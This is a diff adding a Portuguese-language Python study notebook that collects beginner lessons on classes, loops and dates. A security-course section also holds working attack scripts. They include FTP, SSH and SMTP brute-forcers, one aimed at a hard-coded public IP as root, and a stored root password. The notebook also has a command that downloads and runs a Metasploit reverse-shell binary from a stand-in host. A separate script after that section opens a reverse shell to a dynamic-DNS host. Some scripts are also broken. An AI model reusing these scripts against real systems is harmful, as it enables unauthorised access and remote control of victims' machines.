@@ -1,0 +1,1671 @@
+livro
+
+Conceitos fundamentais:
+
+0- Biblioteca:
+É um conjunto de códigos já prontos para uso, próprios da linguagem.
+
+1- Classe:
+É um templete para a criação de objetos.
+
+Em uma abordagem mais prática, uma classe pode ser
+criada como algo que é comum a todas as entidades.
+
+Ex: 
+class Carro:
+    def ligar():
+        print ("Ligando")
+    def acelerar():
+        print ("Acelerando")
+    def frear():
+        print ("Freando")
+    def desligar():
+        print ("Desligado")
+
+
+Carro.ligar()
+>>>Ligando
+
+
+
+1.1 Entidade:
+No exemplo acima entidade é o Carro, 
+
+2- Método:
+É a abstração do processo de uma abstração de dados
+
+3- Função:
+Recurso util próprio da linguagem ou criado pelo usuário.
+
+4- Instancia:
+Exemplo
+
+5- Herança:
+Reaproveitamento de código
+
+6- Atributos de um objeto:
+Caracteristicas básicas.
+
+7- for:
+
+permite percorrer uma lista item a item.
+
+numerosde1a10 = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]
+
+for n in numerosde1a10:
+    print(n)
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+
+IDLE PYTHON >>>:
+
+antes de usar bibliotecas do python é preciso importa-las.
+
+import sys
+sys.platform
+
+(responde sistema operacional em uso)
+
+ex:
+
+import sys
+print(sys.version)
+(exibir versao do python)
+
+import os
+os.uname()
+os.getcwd()
+
+os.environ
+os.getenv("HOME")
+
+(retorna configurações gerais do sistema, variavel de ambiente e diretorio principal)
+
+import datetime
+datetime.date.today()
+
+(Exibe data de hoje)
+
+é possivel também consultar item a item:
+
+datetime.date.today().day
+datetime.date.today().month
+datetime.date.today().year
+
+exibir data como string atraves da função date.isoformat:
+
+datetime.date.isoformat(datetime.date.today())
+2021-02-04
+
+import time
+time.strftime("%H:%M")
+
+(Retorna a hora)
+
+time.strftime("%A %p")
+
+
+>>> import html
+>>> html.scape("This HTML fragment contains a <script>script</script> tag.")
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+AttributeError: module 'html' has no attribute 'scape'
+>>> html.escape("This HTML fragment contains a <script>script</script> tag.")
+'This HTML fragment contains a &lt;script&gt;script&lt;/script&gt; tag.'
+>>> html.unescape("I &hearts; Python's &lt;standard library&gt;.")
+"I ♥ Python's <standard library>."
+
+-------------------------------------------
+
+#Listas no Python ficam entre colchetes
+
+from datetime import datetime
+
+odds = [ 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23,
+25, 27, 29, 31, 33, 35, 37, 39, 41, 43, 45, 47, 49,
+51, 53, 55, 57, 59 ]
+
+----------------------------------------------------
+
+from datetime import datetime
+datahoje = datetime.today()
+print (datahoje)
+
+------------------------------------------------
+
+from datetime import datetime
+
+odds = [ 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39,
+        41, 43, 45, 47, 49, 51, 53, 55, 57, 59 ]
+
+
+right_this_minute = datetime.today().minute
+
+if right_this_minute in odds:
+    print("This minute seems a little odd.")
+else:
+    print("Not an odd minute.")
+
+
+Explicando:
+
+O código acima importa da biblioteca de python o módulo datetime
+O módulo datetime fornece classes para manipulação de datas e horas.
+
+logo em seguida a variavel odds recebe uma lista de numeros impares
+criamos a variavel right_this_minute que armazena a saida da função
+datetime.today() e informamos que queremos apenas o minuto .minute
+
+if right_this_minute in odds:
+    print("This minute seems a little odd.")
+    
+Se o numero do minuto estiver na lista, exiba This...
+Senão
+Exiba Not an....
+
+------------------------------------------
+
+from datetime import datetime
+
+hoje = 'Segunda'
+
+if hoje == 'sexta-feira':
+    print ('Hoje é sexta-feira minha gente!')
+elif hoje == 'Sábado':
+    print ('Hoje é Sábado!')
+else:
+    print ('Hoje não é Sexta-feira e nem Sábado')
+    
+------------------------------------------
+a = random.randint(1,60)
+    print (a)
+
+gera numeros aleatorios
+-----------------------------------------
+from datetime import datetime
+
+odds = [ 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39,
+        41, 43, 45, 47, 49, 51, 53, 55, 57, 59 ]
+
+
+right_this_minute = datetime.today().minute
+
+for n in odds:
+    print(n)
+else:
+    print('')
+    print("Not an odd minute.")
+    
+----------------------------------------------
+
+nomes = ['Pedro', 'João', 'Leticia']
+for n in nomes:
+     print(n)
+     
+-------------------------------------------
+
+import time
+
+while True:
+  localtime = time.localtime()
+  result = time.strftime("%I:%M:%S %p", localtime)
+  print(result)
+  time.sleep(5)
+
+-----------------------------------------------
+import time
+
+print("Printed immediately.")
+time.sleep(2.4)
+print("Printed after 2.4 seconds.")
+
+------------------------------------
+└──╼ #cat introguanabara.py 
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#1
+#nome = raw_input('Qual é o seu nome? ')
+#idade = raw_input('Qual é sua idade? ')
+#peso = raw_input('Quanto você pesa? ')
+#print(nome,idade,peso)
+
+#2
+
+n1 = input('Digite o primeiro numero da soma: ')
+n2 = input('Digite o segundo numero da soma: ')
+s = (n1 + n2)
+
+#print "A soma entre os numeros é: ", s
+print "A soma entre {} e {} é: {}".format(n1, n2, s)
+
+-----------------------------------------------------
+
+Seção SOLYD
+
+nome = input("Digite seu nome: ") #variavel input usada pra receber dados
+cpf = input("Digite seu cpf: ")
+endereco = input("Digite seu endereco: ")
+idade = input("Digite sua idade: ")
+altura = input("Digite sua altura: ")
+telefone = input("Digite seu telefone: ")
+
+print('Nome: ','"'+str(nome)+'"')
+print('Cpf: ', '"'+str(cpf)+'"')
+print('Endereço: ', '"'+str(endereco)+'"')
+print('Idade: ', '"'+str(idade)+'"')
+print('Altura: ', '"'+str(altura)+'"')
+print('Telefone: ', '"'+str(telefone)+'"')'''
+EXERCICIO:
+Faça um programa que pergunte a idade, o peso e a altura
+de uma pessoa e decide se ela estÃ¡ apta a ser do Exercito
+Para entrar no exercito Ã© preciso ter mais de 18 anos
+pesar mais ou igual  60 kilos
+e medir mais ou igual 1,70 metros
+'''
+
+idade = int(input('Escreva sua idade: '))
+peso = float(input('Escreva seu peso: '))
+altura = float(input('Escreva sua altura: '))
+
+if idade >= 18 and peso >= 60 and altura >= 1.70:
+    print('Voce esta apto a servir o exercito')
+else:
+    print('Voce nao esta apto')
+'''
+EXERCICIO: FaÃ§a um programa que leia a quantidade de pessoas que
+serao convidadas para uma festa.
+ApÃ³s isso o programa irÃ¡ perguntar o nome de todas as pessoas e
+colocar numa lista de convidados
+ApÃ³s isso irÃ¡ imprimir todos os nomes da lista
+'''
+print('Programinha de controle de festinhas 1.0')
+print('########################################')
+
+numero_de_convidados = input('Coloque o numero de convidados: ')
+lista_de_convidados = []
+
+i = 1 # i recebe o valor de 1
+while i <= int(numero_de_convidados): #enquanto i for <= numero de covidados (repita o seguinte)
+    nome_do_convidado = input('Coloque o nome do convidado #'+ str(i) +': ') #anote entradas em nome_do_convidado e concatene com i(1)
+    lista_de_convidados.append(nome_do_convidado) #inclua o nome_do_convidado em lista_de_convidados
+    i += 1 #incremente 1 a variavel i, #Toda vez que a stack chegar no final desse laço o valor de i é somado a 1.
+
+print('Serão', numero_de_convidados, 'convidados') #seguindo o fluxo ja fora do laço exiba...
+
+print('\nLISTA DE CONVIDADOS') #exiba a lista de convidados
+for convidado in lista_de_convidados:  #Para convidado armazene o que estiver dentro de lista_de_convidados
+    print(convidado)        #exiba o que estiver dentro do apelido de lista de convidados.
+
+#nesse programa a variavel i assume um papel determinante, ela aparece sendo concatenada dentro do laço
+#porque desta forma input consegue ler o valor atual dela a cada vez que um novo convidado é digitado.'''
+EXERCICIO: Escreva uma funcao que recebe um objeto de coleÃ§Ã£o
+e retorna o valor do maior numero dentro dessa colecao
+faÃ§a outra funcao que retorna o menor numero dessa coleÃ§ao
+'''
+import sys
+
+def maior(colecao):
+    maior_item = colecao[0]
+    for item in colecao:
+        if item > maior_item:
+            maior_item = item
+    return maior_item
+
+def menor(colecao):
+    menor_item = colecao[0]
+    for item in colecao:
+        if item < menor_item:
+            menor_item = item
+    return menor_item
+
+print(maior([1,-2,1.2,87.2,1289,-7,0]))
+import requests
+import json
+
+def lista_filmes(titulo):
+    lista = []
+    for i in range(1, 101):
+        try:
+            print('Pesquisando em pagina:', i)
+            url = 'http://www.omdbapi.com/?s=' + titulo + '&type=movie&page=' + str(i)
+            req = requests.get(url)
+            resposta = json.loads(req.text)
+            if resposta['Response'] == 'True':
+                for filme in resposta['Search']:
+                    tit = filme['Title']
+                    ano = filme['Year']
+                    string = tit + ' (' + ano + ')'
+                    lista.append(string)
+            else:
+                print('Fim das paginas')
+                break
+        except:
+            print('Conexao falhou')
+    return lista
+
+sair = False
+while not sair:
+    op = input('Pesquise por um filme ou digite SAIR: ')
+    if op == "SAIR":
+        sair = True
+    else:
+        lista_de_filmes = lista_filmes(op)
+        print('Filmes encontrados:', len(lista_de_filmes))
+        for filme in lista_de_filmes:
+            print(filme)
+nome = input("Digite seu nome: ") #variavel input usada pra receber dados
+cpf = int(input("Digite seu cpf: "))
+endereco = input("Digite seu endereco: ")
+idade = input("Digite sua idade: ")
+altura = input("Digite sua altura: ")
+telefone = input("Digite seu telefone: ")
+me = 100 # testando passagem de tipo de um numero inteiro escrito fora da entrada
+
+# a função str() pode ser usada para converter dados de entrada em uma string.
+# a função int() pode ser usada para converter dados de entrada para um número inteiro.
+# a função float() pode ser usada para converter dados de entrada para um número real.
+#Observe que algumas funções não devem ser concatenadas juntas, str + int na mesma linha nao cola
+# Pra resolver isso passamos o int na variavel de entrada no caso cpf. Mesmo com a str no print o type exibe int para cpf
+
+
+print ('Nome: ','"',nome+'"', ' de cpf ', '"'+str(cpf)+'"', '\n' 'mora em ', '"'+str(endereco)+'"',  ' tem ', '"'+str(idade)+'"', ' anos, mede ', '"'+str(altura)+'"', ' e seu número é ', '"'+str(telefone)+'"')
+
+# a função type() pode ser usada para especificar o tipo de dado que uma variavel esta recebendo.
+
+print (me, type(me), type(nome), type(cpf), type(endereco), type(idade), type(altura), type(telefone))
+#!/usr/bin/python
+import requests
+import json
+
+def lista_filmes(titulo):
+    lista = []
+    for i in range(1, 101):
+        try:
+            print('Pesquisando em pagina:', i)
+            url = 'http://www.omdbapi.com/?s=' + titulo + '&type=movie&page=' + str(i)
+            req = requests.get(url)
+            resposta = json.loads(req.text)
+            if resposta['Response'] == 'True':
+                for filme in resposta['Search']:
+                    tit = filme['Title']
+                    ano = filme['Year']
+                    string = tit + ' (' + ano + ')'
+                    lista.append(string)
+            else:
+                print('Fim das paginas')
+                break
+        except:
+            print('Conexao falhou')
+    return lista
+
+sair = False
+while not sair:
+    op = input('Pesquise por um filme ou digite SAIR: ')
+    if op == "SAIR":
+        sair = True
+    else:
+        lista_de_filmes = lista_filmes(op)
+        print('Filmes encontrados:', len(lista_de_filmes))
+        for filme in lista_de_filmes:
+            print(filme)
+jogador = "Ronaldinho"
+time = "RealMadrid"
+
+print(f'O {jogador}, pertencente ao time {time}')
+
+print('O {}, pertencente ao time {}' .format('Ronaldinho', 'RealMadrid'))
+def soma (n1 , n2):
+    resp = n1 + n2
+    return resp
+
+retorno = (10 + 7)
+
+print (retorno)
+#Class
+#Syntaxe
+
+#altura, cor_da_pele, idade
+
+class Pessoa:
+    def __init__(self, altura, cor_da_pele, idade):
+        self.altura = altura
+        self.cor_da_pele = cor_da_pele
+        self.idade = idade
+
+    def idioma(self):
+        return 'inglês'
+
+bruna = Pessoa('152', 'branca', '28')
+rafael = Pessoa('180', 'moreno', '24')
+anao = Pessoa('100', 'branca', '18')
+print(f'{bruna.altura} {bruna.cor_da_pele} {bruna.idade} {bruna.idioma()}')
+print(rafael.altura,rafael.cor_da_pele,rafael.idade)
+print(anao.altura,anao.cor_da_pele,anao.idade)nome = "Rafael"
+idade = 24
+altura = 1.78
+peso = 70
+
+tipo_nome = type(nome)
+tipo_idade = type(idade)
+tipo_altura = type(altura)
+tipo_peso = type(peso)
+
+print (nome, tipo_nome, idade, tipo_idade, altura, tipo_altura, peso, tipo_peso)
+
+----------------------------------------------------------------------------------------
+
+Seção DESEC
+
+#!/usr/bin/python
+import sys
+
+if len(sys.argv) <= 2:
+	print "Modo de uso: script.py 192.168.0 80"
+else:
+	print ""
+	print "Varrendo o host:",sys.argv[1],"na porta",sys.argv[2]
+	print ""
+	print "Iniciando Descoberta de hosts: "
+	for ip in range(1,10):
+		print "Varrendo hosts: 192.168.0.%s" %ip
+#!/usr/bin/python
+
+import socket
+
+ip = raw_input("Digite o ip: ")
+porta = input("Digite a porta: ")
+
+meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+meusocket.connect_ex((ip,porta))
+banner = meusocket.recv(1024)
+print banner
+#!/usr/bin/python
+import socket,sys,re
+
+if len(sys.argv) != 4:
+	print "Modo de uso: python bruteftp.py 127.0.0.1 usuario wordlist.txt"
+	sys.exit()
+
+target = sys.argv[1]
+usuario = sys.argv[2]
+
+f = open(sys.argv[3])
+for palavra in f.readlines():
+
+	print "Realizando Bruteforce FTP: %s:%s"%(usuario,palavra)
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,22))
+	s.recv(1024)
+
+	s.send("USER "+usuario+"\r\n")
+	s.recv(1024)
+	s.send("PASS "+palavra+"\r\n")
+	resposta = s.recv(1024)
+	print resposta
+	s.send("QUIT\r\n")
+
+	if re.search('230', resposta):
+		print "[+] Senha encontrada, Dados de Acesso: %s:%s"%(usuario,palavra)
+		break
+else:
+	print ""
+	print "[-] A senha nao foi encontrada!"
+#!/usr/bin/python
+import paramiko
+
+ssh = paramiko.SSHClient()
+ssh.load_system_host_keys()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+f = open('wl.txt')
+for palavra in f.readlines():
+	senha = palavra.strip()
+
+	try:
+		ssh.connect('191.252.181.31', username='root', password=senha)
+
+	except paramiko.ssh_exception.AuthenticationException:
+
+		print "Testando com:",senha
+	else:
+		print "[+] Senha encontrada ===>",senha
+		break
+ssh.close()
+#!/usr/bin/python
+import paramiko,sys
+
+if len(sys.argv) != 4:
+	print "Modo de uso: python brutessh.py host user pass.txt"
+	sys.exit()
+else:
+
+	ssh = paramiko.SSHClient()
+	ssh.load_system_host_keys()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+f = open(sys.argv[3])
+for palavra in f.readlines():
+	senha = palavra.strip()
+
+	try:
+		ssh.connect(sys.argv[1], username=sys.argv[2], password=senha)
+
+	except paramiko.ssh_exception.AuthenticationException:
+
+		print "Testando com:",senha
+	else:
+		print "[+] Senha encontrada ===>",senha
+		break
+ssh.close()
+#!/usr/share/python
+import socket,sys
+
+if len(sys.argv) <= 1:
+	print "Use mode to search by hostnames: python consulta.py exemple.com \n"
+	print "Use mode to search by ip address: python consulta.py 191.250.22.1 \n"
+else:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("whois.iana.org",43))
+	s.send(sys.argv[1]+"\r\n")
+	resposta = s.recv(1024).split()
+	whois = resposta[19]
+	s.close()
+	s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s1.connect((whois,43))
+	s1.send(sys.argv[1]+"\r\n")
+	resp = s1.recv(1024)
+	print resp
+#!/usr/bin/python
+
+lista=["A"]
+contador=100
+
+while len(lista) <= 50:
+	lista.append("A"*contador)
+	contador = contador + 100
+
+for dados in lista:
+	print "Fuzzing com SEND %s bytes"%len(dados)
+
+
+#import socket
+#
+#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.connect(("192.168.0.3",5800))
+#banner = recv(1024)
+#print banner
+#s.send("HELP\r\n")
+#r = s.recv(1024)
+#print r
+#!/usr/bin/python
+import socket
+
+lista=["A"]
+contador=100
+
+while len(lista) <= 50:
+	lista.append("A"*contador)
+	contador = contador + 100
+
+for dados in lista:
+	print "Fuzzing com SEND %s bytes"%len(dados)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("192.168.0.5",21))
+	s.recv(1024)
+	s.send("USER "+dados+"\r\n")
+#!/usr/bin/python
+#import hashlib,sys
+
+#if len(sys.argv) <= 2:
+#	print "Modo de uso: python genhashsimple.py 12345678 md5"
+#else: 	texto = sys.argv[1]
+#type = sys.argv[2]
+#md5 = hashlib.md5(texto).hexdigest()
+#sha1 = hashlib.sha1(texto).hexdigest()
+#
+#if type == md5 :
+#	print md5
+#else:
+#	exit(0)
+#if type == sha1:
+#	print sha1
+#else:
+#	exit
+import hashlib,sys,base64
+
+print
+print "         Modo de uso: python genhashsimple.py 12345678 md5"
+print
+
+md5 = hashlib.md5()
+md5.update(sys.argv[2])
+
+sha1 = hashlib.sha1()
+sha1.update(sys.argv[2])
+
+sha256 = hashlib.sha256()
+sha256.update(sys.argv[2])
+
+sha512 = hashlib.sha512()
+sha512.update(sys.argv[2])
+
+pgp = hashlib.pgp()
+pgp.update(sys.argv[2])
+
+if len(sys.argv) < 2 :
+       print
+       print "         Hash para sys.argv[2] :"
+       print
+else:
+	if (sys.argv[2]) == "md5" :
+		print md5.hexdigest()
+		exit(0)
+	elif (sys.argv[2]) == "sha1" :
+		print sha1.hexdigest()
+		exit(0)
+	if (sys.argv[2]) == "sha256" :
+		print sha256.hexdigest()
+		exit(0)
+	elif (sys.argv[2]) == "sha512" :
+		print sha512.hexdigest()
+		exit(0)
+	if (sys.argv[2]) == "pgp" :
+	    print pgp.hexdigest()
+	    exit(0)
+	else:
+		print "         Argumentos diferem dos dispiniveis"
+#!/usr/bin/python
+
+import socket
+
+print "Interagindo com FTP SERVER"
+
+ip = raw_input("Digite o ip: ")
+porta = 21
+
+meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+meusocket.connect_ex((ip,porta))
+banner = meusocket.recv(1024)
+print banner
+
+print "Enviando usuario"
+meusocket.send("USER ftp\r\n")
+banner = meusocket.recv(1024)
+print banner
+
+print "Enviando senha"
+meusocket.send("PASS ftp\r\n")
+banner = meusocket.recv(1024)
+print banner
+#!/usr/bin/python
+
+import socket,sys
+
+ip = raw_input("Digite o ip: ")
+porta = input("Digite a porta: ")
+
+meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+res = meusocket.connect_ex((ip,porta))
+
+if (res == 0):
+	print("Porta Aberta")
+else:
+	print("Porta Fechada")
+#!/usr/bin/python
+import os
+print "Baixando, dando permissoes e executando uma shellreverse"
+os.system("wget https://seuhostbad.com/shellmetasploit.elf && chmod 777 shellmetasploit.elf && ./shellmetasploit.elf")
+#!/usr/bin/python
+
+import socket,sys
+
+for porta in range(1,65535):
+	meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	if meusocket.connect_ex((sys.argv[1],porta)) == 0:
+		print "Porta",porta,"[ABERTA]"
+		meusocket.close()
+#!/usr/bin/python
+
+import socket,sys
+
+ip = raw_input("Digite o ip: ")
+porta = int(raw_input("Digite a porta: "))
+
+meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+res = meusocket.connect_ex((ip,porta))
+
+if (res == 0):
+	print "Porta aberta"
+	meusocket.close()
+else:
+	print "Porta fechada"
+	meusocket.close()
+#!/usr/bin/python
+import socket,sys
+
+host = sys.argv[1]
+
+print host, "--->",socket.gethostbyname(host)
+#!/usr/bin/python
+#Meu primeiro script
+print "Visual"
+ip = raw_input("Digite o IP: ") #string
+porta = input("Digite a porta: ") #inteiro
+ver = 1.2
+
+print "Scan versao:",ver
+print "Varrendo Host:",ip,"na porta",porta
+
+print "IP - ",type(ip) #pode remover esses 3 types se quiser...
+print "Porta - ",type(porta)
+print "Ver - ",type(ver)
+
+print "Visual versao: %.1f \n Varrendo Host: %s na porta %i" %(ver,ip,porta)
+#!/usr/bin/python
+import socket,sys,re
+
+if len(sys.argv) !=2:
+	print "Modo de uso: python smtpbrute.py IP usuario"
+	sys.exit(0)
+else:
+
+file = open("listasmtp.txt")
+for linha in file:
+	print linha
+	if re.search("252",user):
+		print "Usuario encontrado: "+user.strip("252 2.0.0")
+	tcp = socket.sock(socket.AF_INET, socket.SOCK_STREAM)
+	tcp.connect((sys.argv[1],25))
+	banner = tcp.recv(1024)
+	tcp.send("VRFY"+linha)
+	user = tcp.recv(1024)
+	print user
+#!/usr/bin/python
+import socket,sys
+
+if len(sys.argv) !=3:
+	print "Modo de uso: python smtp enumenum.py IP usuario"
+	sys.exit(0)
+
+tcp = socket.sock(socket.AF_INET, socket.SOCK_STREAM)
+tcp.connect((sys.argv[1],25))
+
+banner = tcp.recv(1024)
+print banner
+
+#tcp.send("VRFY"+sys.argv[2]+"\r\n")
+#user = tcp.recv(1024)
+#print user
+#!/usr/bin/python
+import paramiko
+
+ssh = paramiko.SSHClient()
+ssh.load_system_host_keys()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+try:
+
+	ssh.connect('191.252.181.31', username='root', password='HaCKer2020**24')
+
+except paramiko.ssh_exception.AuthenticationException:
+	print "Acesso Falhou"
+else:
+	print "Conectado"
+
+	stdin, stdout, stderr = ssh.exec_command('id')
+
+	for linha in stdout.readlines():
+
+		print linha.strip()
+
+ssh.close()
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.3",5800))
+banner = recv(1024)
+print banner
+s.send("HELP\r\n")
+r = s.recv(1024)
+print r
+#!/usr/bin/python
+import urllib
+
+objeto = raw_input("Digite o site: ")
+site = urllib.urlopen(objeto)
+server = site.info()
+
+print "O servidor web esta rodando:"
+print server
+#!/usr/bin/python
+import requests
+
+objeto = raw_input("Digite o site: ")
+site = requests.get(objeto)
+status = site.status_code
+
+if (status == 200):
+	print "Pagina Existe"
+else:
+	print "Pagina Inexistente"
+
+
+---------------------------------------------------
+
+import socket,os
+
+ip = "sechost.ddns.net"
+porta = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,porta))
+
+while True:
+	cmd = s.recv(1024)
+	for comando in os.popen(cmd):
+		s.send(comando)
+		
+		
+-----------------------------------------------------
+
+Iterando com loop For, use for para loops limitados, e while para ilimitados.
+
+>>> for i in [ 1, 2, 3 ]:
+...     print (i)
+... 
+1
+2
+3
+>>> for ch in "Hi!":
+...     print (ch)
+... 
+H
+i
+!
+
+>>>
+for num in range (5):
+...     print ('Head First Rocks!')
+... 
+Head First Rocks!
+Head First Rocks!
+Head First Rocks!
+Head First Rocks!
+Head First Rocks!
+
+-------------------------------------
+
+Primeiro programa:
+
+from datetime import datetime
+import time
+
+Impar = [ 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39,
+        41, 43, 45, 47, 49, 51, 53, 55, 57, 59 ]
+
+Par = [ 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40,
+        42, 44, 46, 48, 50, 52, 54, 56, 58, 60 ]
+
+
+for i in range (5):
+        right_this_minute = datetime.today().minute
+        if right_this_minute in Impar:
+                print("O minuto da hora atual é Impar.", datetime.today().minute, time.sleep(30))
+        elif right_this_minute in Par:
+                print("O minuto da hora atual é Par.", datetime.today().minute, time.sleep(30))
+        else:
+                print("Fim")
+                
+---------------------------------------------------------------
+
+laço com while:
+
+x = 1
+
+while x <= 10:
+    print (x)
+    x = x + 1
+
+vai incrementar somar o valor atual de x + 1 cada vez que retornar ao inicio do fluxo,
+até que seja igual ao valor definido no laço.
+
+---------------------------------------------
+
+#!/usr/bin/python
+def main():
+  x = 0
+
+
+# define a while loop
+  while (x<5):
+    print(x)
+    x = x + 1
+
+
+------------------------------------------------------
+
+Dica:
+
+import sys
+
+if sys.version_info.major == 2:
+    usuario = raw_input(‘Insira seu login: ‘)
+elif sys.version_info.major == 3:
+    usuario = input(‘Insira seu login: ‘)
+
+funções inseguras:
+input e eval
+
+eval("os.system(‘ls /’)")
+
+
+------------------------------------------------------
+
+Nota: É possivel com o sleep agendar a execução ou o intervalo de de um programa mal
+intencionado. Facilitando o momento em que o atacante recebe a interação.
+
+---------------------------------------------------------------------------------
+
+class Garrafa:
+    def __init__(self, recipiente, tampa):
+        self.recipiente = recipiente
+        self.tampa = tampa
+
+brinde = Garrafa('2L', 'Azul')
+print('brinde.recipiente', brinde.tampa)
+
+---------------------------------------------------------------------------------
+
+'''
+class Garrafa:
+    def __init__(self, recipiente, tampa):
+        self.recipiente = recipiente
+        self.tampa = tampa
+
+brinde = Garrafa('2L', 'Azul')
+print(brinde.recipiente, brinde.tampa)
+'''
+
+'''
+Uma empresa precisa catalogar informações pessoais sobre 5 candidatos,
+estas informações devem ser dispostas em 2 partes:
+
+Informações Cadastrais: Nome, Telefone, Endereço, Cep, Vaga pretendida e Pretenção salarial.
+
+Informações Físicas: Altura, Cor da pele e Peso.
+
+Elabore uma solução utilizando OOP, de maneira que ao executar o programa
+o usuário possa entrar com esses dados. E eles sejam exibidos de forma organizada.
+'''
+
+class Dados_Cadastrais:
+        def __init__(self, Nome, Telefone, Endereco, Cep, Vaga_Pretendida, Pretencao_Salarial):
+                self.Nome = Nome
+                self.Telefone = Telefone
+                self.Endereco = Endereco
+                self.Cep = Cep
+                self.Vaga_Pretendida = Vaga_Pretendida
+                self.Pretencao_Salarial = Pretencao_Salarial
+
+class Dados_Pessoais:
+        def __init__(self, Altura, Cor_da_Pele, Idade, Peso):
+                self.Altura = Altura
+                self.Cor_da_Pele = Cor_da_Pele
+                self.Idade = Idade
+                self.Peso = Peso
+
+
+candidato1 = Dados_Cadastrais('Fulano', '12345678', 'Rua xyz', '890xxx', 'Analista', '1000')
+print(candidato1.Nome, candidato1.Telefone, candidato1.Endereco, candidato1.Cep, candidato1.Vaga_Pretendida, candidato1.Pretencao_Salarial)
+
+------------------------------------------------------------------------------
+
+def mostraLinha():
+    print('--------------------------------')
+    
+    
+    mostraLinha()
+    print('     texto 1     ')
+    mostraLinha()
+    print('     texto 2     ')
+    mostraLinha()
+    print('     texto 3     ')
+    mostraLinha()
+    
+-------------------------------------------------------
+
+Linkedin Learning (Python Learning) 
+
+
+#def main():
+#    x = 0
+
+#while x < 5:
+#    print(x)
+#   x = x+1
+#for x in range (5, 10):
+#    print(x)
+#    while x < 5:
+#        print(x)
+#        x = x+1
+# define a for loop
+#for x in range(5, 10):
+#    print(x)
+
+
+# use a for loop over a collection
+#days=["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
+#for d in days:
+#    print(d)
+
+# Use the break and continue statments
+#for x in range(5,10):
+#    if (x==9): break
+#    if (x % 2 == 0): continue
+#    print(x)
+
+# Using the enumerate() function to get index
+days=["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
+for i,d in enumerate(days):
+    print(i, d)
+    
+--------------------------------------------------------------
+
+from datetime import date
+
+today = date.today()
+print("Today's date is ", today)
+print("Date components: ", today.day, today.month, today.year)
+    
+-----------------------------------------------------------------
+
+# Exemple file for working with classes
+
+class myClass():
+    def method1(self):
+        print("myClass method1")
+
+    def method2(self, someString):
+        print("myClass  method2 " + someString)
+
+class anotherClass(myClass):
+    def method1(self):
+        myClass.method1(self)
+        print("anotherClass method1")
+
+    def method2(self, someString):
+        print("anotherClass  method2")
+
+def main():
+    c = myClass()
+    c.method1()
+    c.method2("This is a string")
+
+    c2=anotherClass()
+    c2.method1()
+    c2.method2("This is a string")
+
+
+-------------------------------------------------------------------------------
+
+class Person:
+  def __initialize__(self, name, age, sex):
+    self.name = name
+    self.age = age
+    self.sex = sex   
+    
+----------------------------------------------------------
+
+def SetAnnual():
+  global annual
+  annual=10000
+def PrintMonthly():
+  print("Your monthly payment is "+str(annual/12)+" USD.")
+SetAnnual()
+PrintMonthly()
+
+------------------------------------------------------------------------------
+
+#def inc(a,b=1):
+#    return(a+b)
+#a=inc(1)
+#a=inc(a,a)
+#print(a)
+
+-------------------------------------------
+
+from datetime import date
+
+today = date.today()
+print("Today's date is ", today)
+print("Date components: ", today.day, today.month, today.year)
+
+--------------------------------------------------------------------
+
+from datetime import datetime
+
+now = datetime.now()
+
+print(now.strftime("Locale date and time: %c"))
+print(now.strftime("Locale date: %x"))
+print(now.strftime("Locale time: %X"))
+print(now.strftime("%a, %d %B, %y"))
+print(now.strftime("Current time: %I:%M:%S %p"))
+print(now.strftime("24-hour: %H:%M"))
+
+-----------------------------------------------------------------------------
+
+from datetime import datetime
+from datetime import timedelta
+from datetime import time
+from datetime import date
+
+
+
+now = datetime.now()
+
+print("Today is: " + str(now))
+print(timedelta(days=365, hours=5,minutes=1))
+print("One year from now it will be: " + str(now + timedelta(days=365)))
+print("In two days and two weeks, it will be " + str(now + timedelta(days=2, weeks=3)))
+hoje = date.today()
+hoje2 = datetime.today()
+print(hoje)
+print(hoje2)
+semanaanterior = datetime.now() - timedelta(weeks=1)
+s = semanaanterior.strftime("%A %B %d, %Y")
+print("One week ago it was: " + s)
+
+#Quantos dias ateh tal data?
+afd = date(hoje.year, 4, 1)
+
+if afd < hoje:
+    print("April Fool's day alread went by %d days ago" % ((hoje-afd).days))
+    afd = afd.replace(year = hoje.year+1)
+
+time_to_afd = afd-hoje
+print("It's just ", time_to_afd.days, "days unstil April Fool's Day")
+
+-------------------------------------------------------------------
+today=date.today()
+days=["Mon","Tue","Wed","Thu","Fri","Sat","Sun"]
+print("Tomorrow will be "+days[(today.weekday()+1)%7])
+
+-------------------------------------------------
+
+[ { "country": [
+        { "city": "New York", "state": "NY" },
+        { "city": "Boston", "state": "MA" }
+  ]},
+  { "country": [
+        { "city": "Quebec", "state": "QC" },
+        { "city": "Toronto", "state": "ON" }
+  ]} ]
+  
+  
+It is possible, by using one for i in theJSON loop and within it another nested for j in i["country"] loop.
+
+-------------------------------------------------------------------------------
+
